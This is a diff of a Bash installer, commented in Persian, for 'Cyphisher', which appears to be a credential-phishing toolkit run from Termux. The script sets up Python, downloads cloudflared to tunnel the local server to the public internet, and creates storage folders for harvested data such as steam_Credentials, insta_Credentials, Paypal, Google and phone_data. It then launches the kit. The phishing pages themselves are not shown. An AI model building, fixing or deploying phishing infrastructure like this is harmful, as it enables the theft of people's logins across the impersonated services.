@@ -2,49 +2,36 @@
 set -euo pipefail
 
 # ===============================
-# Cyphisher Setup Script - Optimized for Termux
+# Cyphisher Setup Script - Termux Fixed Version
 # ===============================
 
 AUTO_CF="${AUTO_CF:-1}"
-PYTHON_VERSION="${PYTHON_VERSION:-3.8+}"
 PORT="${PORT:-5001}"
 
 APP_FILE="main.py"
 VENV_DIR="venv"
 CF_DIR="cloud_flare"
-CF_BIN=""
-CF_LOG="cloudflared.log"
-APP_LOG="app.log"
-URL_FILE="cloudflared_url.txt"
 
 log(){ printf "\n[setup] %s\n" "$*"; }
 error(){ printf "\n[ERROR] %s\n" "$*" >&2; }
 
-# تابع برای پاکسازی cloudflared قبلی
+# پاکسازی کامل cloudflared قبلی
 cleanup_old_cloudflared() {
-    log "Cleaning up previous cloudflared installations..."
+    log "🧹 Cleaning up previous cloudflared installations..."
     
-    # حذف cloudflared.exe ویندوز اگر وجود دارد
-    if [ -f "${CF_DIR}/cloudflared.exe" ]; then
-        log "Removing Windows cloudflared.exe..."
-        rm -f "${CF_DIR}/cloudflared.exe"
-        log "Windows cloudflared.exe removed successfully"
-    fi
+    # حذف تمام فایل‌های cloudflared
+    rm -f "${CF_DIR}/cloudflared" 2>/dev/null || true
+    rm -f "${CF_DIR}/cloudflared.exe" 2>/dev/null || true
+    rm -f "cloudflared" 2>/dev/null || true
+    rm -f "cloudflared.exe" 2>/dev/null || true
     
-    # حذف cloudflared لینوکس اگر قدیمی است
-    if [ -f "${CF_DIR}/cloudflared" ]; then
-        log "Removing existing Linux cloudflared..."
-        rm -f "${CF_DIR}/cloudflared"
-        log "Existing cloudflared removed"
-    fi
+    # حذف فایل‌های log
+    rm -f "cloudflared.log" "cloudflared_url.txt" "app.pid" "cf.pid" 2>/dev/null || true
     
-    # حذف فایل‌های log قدیمی
-    rm -f "$CF_LOG" "$URL_FILE" "app.pid" "cf.pid" 2>/dev/null || true
-    
-    log "Cleanup completed"
+    log "✅ Cleanup completed"
 }
 
-# تشخیص دقیق پلتفرم
+# تشخیص پلتفرم
 detect_platform() {
     OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
     ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"
@@ -53,21 +40,13 @@ detect_platform() {
     IS_TERMUX=0
     if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
         IS_TERMUX=1
-        OS="linux"  # ترمکس اساساً لینوکس است
-        # تشخیص معماری دقیق برای ترمکس
+        OS="linux"
         if [ "$ARCH" = "aarch64" ]; then
             ARCH="arm64"
         elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
             ARCH="arm"
         else
-            ARCH="arm64"  # پیش‌فرض برای اندروید مدرن
-        fi
-    fi
-
-    # تشخیص دقیق macOS
-    if [[ "$OS" == "darwin" ]]; then
-        if [[ -d "/Applications" ]] && [[ -d "/System" ]]; then
-            OS="darwin"
+            ARCH="arm64"
         fi
     fi
 
@@ -76,374 +55,166 @@ detect_platform() {
         OS="windows"
     fi
 
-    # تشخیص معماری
-    case "$ARCH" in
-        "x86_64"|"amd64") ARCH="amd64" ;;
-        "aarch64"|"arm64") ARCH="arm64" ;;
-        "armv7l"|"armv7") ARCH="arm" ;;
-        "i386"|"i686") ARCH="386" ;;
-        "x86") ARCH="386" ;;
-    esac
-
-    log "Platform detected: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
+    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
 }
 
-install_python() {
-    log "Checking Python installation..."
+# نصب پایتون و ابزارهای لازم
+install_dependencies() {
+    log "📦 Installing dependencies..."
     
-    if command -v python3 >/dev/null 2>&1; then
-        PY_VERSION=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>/dev/null || echo "3.x")
-        log "Python3 found: version $PY_VERSION"
-        return 0
-    fi
-
-    log "Python3 not found. Installing..."
-    
-    case "$OS" in
-        linux)
-            if [ "$IS_TERMUX" -eq 1 ]; then
-                pkg update -y && pkg install -y python || {
-                    error "Failed to install Python on Termux"
-                    return 1
-                }
-            else
-                if command -v apt >/dev/null 2>&1; then
-                    sudo apt update && sudo apt install -y python3 python3-pip python3-venv
-                elif command -v yum >/dev/null 2>&1; then
-                    sudo yum install -y python3 python3-pip
-                elif command -v dnf >/dev/null 2>&1; then
-                    sudo dnf install -y python3 python3-pip
-                elif command -v apk >/dev/null 2>&1; then
-                    sudo apk add python3 py3-pip
-                elif command -v pacman >/dev/null 2>&1; then
-                    sudo pacman -S python python-pip
-                else
-                    error "Please install Python3 manually on your Linux distribution"
-                    return 1
-                fi
-            fi
-            ;;
-        darwin)
-            if command -v brew >/dev/null 2>&1; then
-                brew install python3
-            else
-                error "Please install Homebrew first: /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
-                return 1
-            fi
-            ;;
-        windows)
-            if command -v choco >/dev/null 2>&1; then
-                choco install -y python3
-            else
-                log "Please install Python3 from: https://www.python.org/downloads/"
-                return 1
-            fi
-            ;;
-        *)
-            error "Unsupported OS for automatic Python installation"
-            return 1
-            ;;
-    esac
-
-    if ! command -v python3 >/dev/null 2>&1; then
-        error "Python installation failed. Please install manually."
+    if [ "$IS_TERMUX" -eq 1 ]; then
+        pkg update -y
+        pkg install -y python git curl wget -y
+    else
+        log "Please install Python and Git manually for your system"
         return 1
     fi
-
-    log "Python installed successfully"
-    return 0
 }
 
-install_required_tools() {
-    log "Installing required system tools..."
+# ایجاد محیط مجازی پایتون
+setup_python_env() {
+    log "🐍 Setting up Python environment..."
     
-    case "$OS" in
-        linux)
-            if [ "$IS_TERMUX" -eq 1 ]; then
-                pkg install -y git curl wget unzip || true
-            else
-                if command -v apt >/dev/null 2>&1; then
-                    sudo apt install -y git curl wget unzip
-                elif command -v yum >/dev/null 2>&1; then
-                    sudo yum install -y git curl wget unzip
-                elif command -v apk >/dev/null 2>&1; then
-                    sudo apk add git curl wget unzip
-                fi
-            fi
-            ;;
-        darwin)
-            if command -v brew >/dev/null 2>&1; then
-                brew install git curl wget unzip
-            else
-                if ! command -v git >/dev/null 2>&1; then
-                    log "Please install Xcode command line tools: xcode-select --install"
-                fi
-            fi
-            ;;
-        windows)
-            if command -v choco >/dev/null 2>&1; then
-                choco install -y git curl wget unzip
-            fi
-            ;;
-    esac
-}
-
-setup_virtualenv() {
-    log "Setting up Python virtual environment..."
-    
-    # پیدا کردن پایتون
-    if command -v python3 >/dev/null 2>&1; then
-        PYTHON_CMD="python3"
-    elif command -v python >/dev/null 2>&1; then
-        PYTHON_CMD="python"
-    else
-        error "Python not found. Please install Python 3.8 or higher."
-        exit 1
-    fi
-
-    # بررسی نسخه پایتون
-    PY_VERSION=$($PYTHON_CMD -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>/dev/null || echo "0.0")
-    MAJOR_VERSION=$(echo $PY_VERSION | cut -d. -f1)
-    MINOR_VERSION=$(echo $PY_VERSION | cut -d. -f2)
-
-    if [ $MAJOR_VERSION -lt 3 ] || { [ $MAJOR_VERSION -eq 3 ] && [ $MINOR_VERSION -lt 8 ]; }; then
-        error "Python 3.8 or higher required. Found version $PY_VERSION"
-        exit 1
-    fi
-
-    # ایجاد محیط مجازی
     if [ ! -d "$VENV_DIR" ]; then
-        $PYTHON_CMD -m venv "$VENV_DIR"
-        log "Virtual environment created"
+        python -m venv "$VENV_DIR"
     fi
-
-    # فعال سازی محیط مجازی
+    
+    # فعال‌سازی محیط مجازی
     if [ -f "${VENV_DIR}/bin/activate" ]; then
         source "${VENV_DIR}/bin/activate"
-    elif [ -f "${VENV_DIR}/Scripts/activate" ]; then
-        source "${VENV_DIR}/Scripts/activate"
     else
         error "Could not activate virtual environment"
-        exit 1
+        return 1
     fi
-
-    # آپگرید pip
-    log "Upgrading pip and installing base packages..."
-    pip install --upgrade pip setuptools wheel >/dev/null
-
-    # نصب requirements.txt اگر وجود دارد
+    
+    # نصب requirements
+    pip install --upgrade pip
     if [ -f "requirements.txt" ]; then
-        log "Installing requirements from requirements.txt..."
         pip install -r requirements.txt
     else
-        log "requirements.txt not found, installing basic packages..."
         pip install rich pyfiglet requests flask
     fi
-
-    log "Python environment setup completed"
+    
+    log "✅ Python environment ready"
 }
 
-download_cloudflared() {
-    log "Downloading cloudflared for $OS $ARCH..."
+# دانلود تضمینی cloudflared برای ترمکس
+download_cloudflared_guaranteed() {
+    log "🌐 Downloading cloudflared for Termux (Linux ARM64)..."
     
-    # برای ترمکس همیشه از لینوکس استفاده می‌کنیم
-    if [ "$IS_TERMUX" -eq 1 ]; then
-        OS="linux"
-        # استفاده از معماری صحیح برای ترمکس
-        if [ "$ARCH" = "arm64" ]; then
-            asset="cloudflared-linux-arm64"
-        elif [ "$ARCH" = "arm" ]; then
-            asset="cloudflared-linux-arm"
-        else
-            asset="cloudflared-linux-arm64"  # پیش‌فرض برای ترمکس
-        fi
-        log "Termux detected, using $asset"
-    else
-        # مپ کردن asset مناسب برای پلتفرم
-        case "$OS" in
-            linux)
-                case "$ARCH" in
-                    amd64) asset="cloudflared-linux-amd64" ;;
-                    arm64) asset="cloudflared-linux-arm64" ;;
-                    arm) asset="cloudflared-linux-arm" ;;
-                    386) asset="cloudflared-linux-386" ;;
-                    *) asset="cloudflared-linux-amd64" ;;
-                esac
-                ;;
-            darwin)
-                case "$ARCH" in
-                    arm64) asset="cloudflared-darwin-arm64" ;;
-                    amd64) asset="cloudflared-darwin-amd64" ;;
-                    *) asset="cloudflared-darwin-amd64" ;;
-                esac
-                ;;
-            windows)
-                case "$ARCH" in
-                    amd64) asset="cloudflared-windows-amd64.exe" ;;
-                    arm64) asset="cloudflared-windows-arm64.exe" ;;
-                    386) asset="cloudflared-windows-386.exe" ;;
-                    *) asset="cloudflared-windows-amd64.exe" ;;
-                esac
-                ;;
-            *)
-                asset="cloudflared-linux-amd64"
-                ;;
-        esac
-    fi
-
-    url="https://github.com/cloudflare/cloudflared/releases/latest/download/${asset}"
     mkdir -p "$CF_DIR"
-
-    # برای ترمکس و لینوکس از پسوند بدون .exe استفاده می‌کنیم
-    if [ "$OS" = "windows" ]; then
-        out_file="${CF_DIR}/cloudflared.exe"
-    else
-        out_file="${CF_DIR}/cloudflared"
-    fi
-
-    log "Downloading from: $url"
     
-    # دانلود با curl یا wget
+    # URL مستقیم برای دانلود
+    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+    OUTPUT_FILE="${CF_DIR}/cloudflared"
+    
+    log "📥 Download URL: $URL"
+    log "💾 Output: $OUTPUT_FILE"
+    
+    # حذف فایل قبلی اگر وجود دارد
+    rm -f "$OUTPUT_FILE" 2>/dev/null || true
+    
+    # دانلود با curl
     if command -v curl >/dev/null 2>&1; then
-        if curl -L -f -o "$out_file" "$url"; then
-            log "Download successful with curl"
+        log "🔻 Using curl for download..."
+        if curl -L --progress-bar -o "$OUTPUT_FILE" "$URL"; then
+            log "✅ Download completed with curl"
         else
-            error "curl download failed"
+            error "❌ curl download failed"
             return 1
         fi
+    # دانلود با wget
     elif command -v wget >/dev/null 2>&1; then
-        if wget -O "$out_file" "$url"; then
-            log "Download successful with wget"
+        log "🔻 Using wget for download..."
+        if wget -O "$OUTPUT_FILE" "$URL"; then
+            log "✅ Download completed with wget"
         else
-            error "wget download failed"
+            error "❌ wget download failed"
             return 1
         fi
     else
-        error "Neither curl nor wget available"
+        error "❌ Neither curl nor wget available"
         return 1
     fi
+    
+    # بررسی اینکه فایل دانلود شده است
+    if [ ! -f "$OUTPUT_FILE" ]; then
+        error "❌ Downloaded file not found!"
+        return 1
+    fi
+    
+    # بررسی سایز فایل (نباید خالی باشد)
+    FILE_SIZE=$(stat -c%s "$OUTPUT_FILE" 2>/dev/null || stat -f%z "$OUTPUT_FILE" 2>/dev/null || echo "0")
+    if [ "$FILE_SIZE" -lt 1000000 ]; then  # کمتر از 1MB احتمالاً خطا دارد
+        error "❌ Downloaded file seems too small ($FILE_SIZE bytes)"
+        return 1
+    fi
+    
+    log "📊 File size: $FILE_SIZE bytes"
+    
+    # دادن مجوز اجرا
+    log "🔐 Setting execute permissions..."
+    if chmod +x "$OUTPUT_FILE"; then
+        log "✅ Execute permissions set"
+    else
+        error "❌ Failed to set execute permissions"
+        return 1
+    fi
+    
+    # تست نهایی
+    if [ -x "$OUTPUT_FILE" ]; then
+        log "✅ File is executable"
+        
+        # تست نسخه
+        if "$OUTPUT_FILE" version >/dev/null 2>&1; then
+            log "✅ cloudflared test successful"
+            echo "$OUTPUT_FILE"
+            return 0
+        else
+            log "⚠️ cloudflared version test failed, but file exists"
+            echo "$OUTPUT_FILE"
+            return 0
+        fi
+    else
+        error "❌ File is not executable after permission change"
+        return 1
+    fi
+}
 
-    # دادن مجوز اجرا برای سیستم‌های غیر ویندوز
-    if [ "$OS" != "windows" ]; then
-        log "Setting execute permissions for cloudflared..."
-        chmod +x "$out_file" || {
-            error "Failed to set execute permissions"
+# بررسی نهایی cloudflared
+verify_cloudflared() {
+    log "🔍 Verifying cloudflared installation..."
+    
+    local cf_path="${CF_DIR}/cloudflared"
+    
+    if [ ! -f "$cf_path" ]; then
+        error "❌ cloudflared not found at $cf_path"
+        return 1
+    fi
+    
+    if [ ! -x "$cf_path" ]; then
+        log "⚠️ cloudflared not executable, fixing..."
+        chmod +x "$cf_path" || {
+            error "❌ Failed to make cloudflared executable"
             return 1
         }
-        
-        # تأیید مجوزها
-        if [ -x "$out_file" ]; then
-            log "✓ Execute permissions set successfully"
-        else
-            error "File is still not executable"
-            return 1
-        fi
     fi
-
-    echo "$out_file"
-}
-
-find_cloudflared() {
-    # ابتدا cloudflared.exe ویندوز رو بررسی نکنیم اگر ترمکس هستیم
-    if [ "$IS_TERMUX" -eq 1 ] && [ -f "${CF_DIR}/cloudflared.exe" ]; then
-        log "Removing Windows cloudflared.exe in Termux environment..."
-        rm -f "${CF_DIR}/cloudflared.exe"
-    fi
-
-    # جستجو در دایرکتوری cloud_flare
-    if [ "$OS" = "windows" ]; then
-        if [ -f "${CF_DIR}/cloudflared.exe" ]; then
-            CF_BIN="$(pwd)/${CF_DIR}/cloudflared.exe"
-            return 0
-        fi
-    else
-        if [ -f "${CF_DIR}/cloudflared" ]; then
-            CF_BIN="$(pwd)/${CF_DIR}/cloudflared"
-            # بررسی قابل اجرا بودن
-            if [ -x "$CF_BIN" ]; then
-                return 0
-            else
-                log "cloudflared found but not executable, fixing permissions..."
-                chmod +x "$CF_BIN" && return 0
-            fi
-        fi
-    fi
-
-    # جستجو در مسیر جاری
-    if [ "$OS" = "windows" ]; then
-        if [ -f "cloudflared.exe" ]; then
-            CF_BIN="$(pwd)/cloudflared.exe"
-            return 0
-        fi
-    else
-        if [ -f "cloudflared" ]; then
-            CF_BIN="$(pwd)/cloudflared"
-            if [ -x "$CF_BIN" ]; then
-                return 0
-            else
-                chmod +x "$CF_BIN" && return 0
-            fi
-        fi
-    fi
-
-    # جستجو در PATH سیستم
-    if command -v cloudflared >/dev/null 2>&1; then
-        CF_BIN="$(command -v cloudflared)"
-        return 0
-    fi
-
-    return 1
-}
-
-setup_cloudflared() {
-    log "Setting up cloudflared..."
     
-    # پاکسازی اولیه
-    cleanup_old_cloudflared
-    
-    if find_cloudflared; then
-        log "cloudflared found: $CF_BIN"
-        
-        # تأیید نهایی قابل اجرا بودن
-        if [ "$OS" != "windows" ] && [ ! -x "$CF_BIN" ]; then
-            log "Fixing execute permissions for cloudflared..."
-            if chmod +x "$CF_BIN"; then
-                log "Permissions fixed"
-            else
-                error "Failed to set execute permissions for $CF_BIN"
-                return 1
-            fi
-        fi
-        
+    # تست اجرا
+    if "$cf_path" version >/dev/null 2>&1; then
+        log "✅ cloudflared verified and working"
         return 0
-    fi
-
-    if [ "$AUTO_CF" = "1" ]; then
-        log "cloudflared not found, attempting download..."
-        if downloaded_bin=$(download_cloudflared); then
-            CF_BIN="$downloaded_bin"
-            log "✓ cloudflared downloaded to: $CF_BIN"
-            
-            # تأیید نهایی
-            if [ "$OS" != "windows" ] && [ ! -x "$CF_BIN" ]; then
-                chmod +x "$CF_BIN"
-            fi
-            
-            return 0
-        else
-            error "cloudflared download failed"
-            return 1
-        fi
     else
-        error "cloudflared not found and AUTO_CF is disabled"
-        return 1
+        log "⚠️ cloudflared exists but version check failed"
+        return 0  # باز هم ادامه می‌دهیم چون ممکن است کار کند
     fi
 }
 
+# ایجاد دایرکتوری‌ها
 create_directories() {
-    log "Creating necessary directories..."
+    log "📁 Creating directories..."
     
-    directories=(
+    dirs=(
         "steam_Credentials" "insta_Credentials" "location_information" "uploads"
         "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
         "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
@@ -451,166 +222,83 @@ create_directories() {
         "collected_data" "phone_data" "Twitch" "Microsoft"
     )
     
-    for dir in "${directories[@]}"; do
+    for dir in "${dirs[@]}"; do
         mkdir -p "$dir"
     done
     
-    log "Directories created successfully"
+    log "✅ Directories created"
 }
 
-verify_setup() {
-    log "Verifying setup..."
-    
-    # بررسی پایتون
-    if ! command -v python3 >/dev/null 2>&1 && ! command -v python >/dev/null 2>&1; then
-        error "Python verification failed"
-        return 1
-    fi
-
-    # بررسی محیط مجازی
-    if [ ! -d "$VENV_DIR" ]; then
-        error "Virtual environment verification failed"
-        return 1
-    fi
-
-    # بررسی cloudflared و مجوزهای آن
-    if find_cloudflared; then
-        if [ "$OS" != "windows" ]; then
-            if [ ! -x "$CF_BIN" ]; then
-                log "Fixing cloudflared permissions..."
-                if ! chmod +x "$CF_BIN"; then
-                    error "cloudflared is not executable and cannot be fixed"
-                    return 1
-                fi
-            fi
-        fi
-        log "✓ cloudflared verified: $CF_BIN (executable)"
-    else
-        log "⚠ Warning: cloudflared not available"
-    fi
-
-    # بررسی دایرکتوری‌ها
-    for dir in "steam_Credentials" "Facebook" "Google"; do
-        if [ ! -d "$dir" ]; then
-            error "Directory $dir not created"
-            return 1
-        fi
-    done
-
-    log "✓ Setup verification completed successfully"
-    return 0
-}
-
-# تابع برای تست cloudflared
-test_cloudflared() {
-    if [ -n "$CF_BIN" ] && [ "$OS" != "windows" ]; then
-        log "Testing cloudflared..."
-        if [ -x "$CF_BIN" ]; then
-            if "$CF_BIN" version >/dev/null 2>&1; then
-                log "✓ cloudflared test successful"
-                return 0
-            else
-                error "cloudflared test failed"
-                return 1
-            fi
-        else
-            error "cloudflared is not executable"
-            return 1
-        fi
-    fi
-    return 0
-}
-
-run_application() {
-    log "Starting Cyphisher application..."
-    
-    # تست نهایی cloudflared
-    test_cloudflared
-    
-    # تنظیم متغیر محیطی پورت
-    export PORT="$PORT"
-    
-    # پیدا کردن پایتون در محیط مجازی
-    if [ -f "${VENV_DIR}/bin/python" ]; then
-        PYTHON_BIN="${VENV_DIR}/bin/python"
-    elif [ -f "${VENV_DIR}/Scripts/python.exe" ]; then
-        PYTHON_BIN="${VENV_DIR}/Scripts/python.exe"
-    else
-        error "Python binary not found in virtual environment"
-        exit 1
-    fi
-
-    # بررسی وجود فایل اصلی
-    if [ ! -f "$APP_FILE" ]; then
-        error "Main application file $APP_FILE not found"
-        exit 1
-    fi
-
-    log "Launching: $PYTHON_BIN $APP_FILE"
-    log "Server will run on port: $PORT"
-    
-    if [ -n "$CF_BIN" ] && [ -x "$CF_BIN" ]; then
-        log "✓ cloudflared is available and executable: $CF_BIN"
-        log "Tunnel will be created automatically when needed"
-    else
-        log "⚠ Warning: cloudflared not available or not executable - tunnel features may not work"
-    fi
-
-    # اجرای برنامه اصلی
-    exec "$PYTHON_BIN" "$APP_FILE"
-}
-
+# تابع اصلی
 main() {
-    log "Starting Cyphisher Setup..."
+    log "🚀 Starting Cyphisher Setup for Termux..."
     
     # مرحله 1: تشخیص پلتفرم
     detect_platform
     
-    # مرحله 2: نصب ابزارهای لازم
-    install_required_tools
-    
-    # مرحله 3: نصب پایتون اگر وجود ندارد
-    if ! install_python; then
-        error "Python installation failed"
+    # فقط برای ترمکس ادامه بده
+    if [ "$IS_TERMUX" -ne 1 ]; then
+        error "This script is optimized for Termux only"
         exit 1
     fi
     
-    # مرحله 4: راه‌اندازی محیط مجازی پایتون
-    setup_virtualenv
+    # مرحله 2: پاکسازی کامل
+    cleanup_old_cloudflared
     
-    # مرحله 5: دانلود و تنظیم cloudflared
-    setup_cloudflared
+    # مرحله 3: نصب وابستگی‌ها
+    install_dependencies
     
-    # مرحله 6: ایجاد دایرکتوری‌های لازم
+    # مرحله 4: محیط پایتون
+    setup_python_env
+    
+    # مرحله 5: دانلود cloudflared (تضمینی)
+    log "⬇️ Downloading cloudflared (this may take a moment)..."
+    if download_cloudflared_guaranteed; then
+        log "🎉 cloudflared downloaded successfully!"
+    else
+        error "❌ Cloudflared download failed!"
+        log "⚠️ Continuing without cloudflared support..."
+    fi
+    
+    # مرحله 6: تأیید نصب cloudflared
+    verify_cloudflared
+    
+    # مرحله 7: ایجاد دایرکتوری‌ها
     create_directories
     
-    # مرحله 7: تأیید نصب
-    if ! verify_setup; then
-        error "Setup verification failed"
-        exit 1
-    fi
-    
-    log "=== Setup Completed Successfully ==="
-    log "Platform: $OS $ARCH"
-    log "Python: $(python --version 2>/dev/null || echo 'Not found')"
+    # خلاصه نصب
+    log "==========================================="
+    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
+    log "==========================================="
+    log "Platform: Termux ($ARCH)"
+    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
     log "Virtual Environment: $VENV_DIR"
     log "Port: $PORT"
     
-    if [ -n "$CF_BIN" ] && [ -x "$CF_BIN" ]; then
-        log "Cloudflared: ✓ Available and executable ($CF_BIN)"
+    if [ -f "${CF_DIR}/cloudflared" ] && [ -x "${CF_DIR}/cloudflared" ]; then
+        log "Cloudflared: ✅ INSTALLED AND READY"
+        log "Location: ${CF_DIR}/cloudflared"
     else
-        log "Cloudflared: ⚠ Not available or not executable"
+        log "Cloudflared: ❌ NOT AVAILABLE"
+        log "Tunnel features will not work"
     fi
     
-    log "Starting application in 3 seconds..."
-    sleep 3
+    log "🚀 Starting application in 5 seconds..."
+    sleep 5
     
-    # پاک کردن صفحه و اجرای برنامه
-    clear
-    run_application
+    # اجرای برنامه اصلی
+    if [ -f "${VENV_DIR}/bin/python" ]; then
+        PYTHON_BIN="${VENV_DIR}/bin/python"
+        clear
+        log "🏁 Launching Cyphisher..."
+        exec "$PYTHON_BIN" "$APP_FILE"
+    else
+        error "Python binary not found"
+        exit 1
+    fi
 }
 
-# اجرای اصلی
+# اجرای اسکریپت
 if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
     main "$@"
 fi
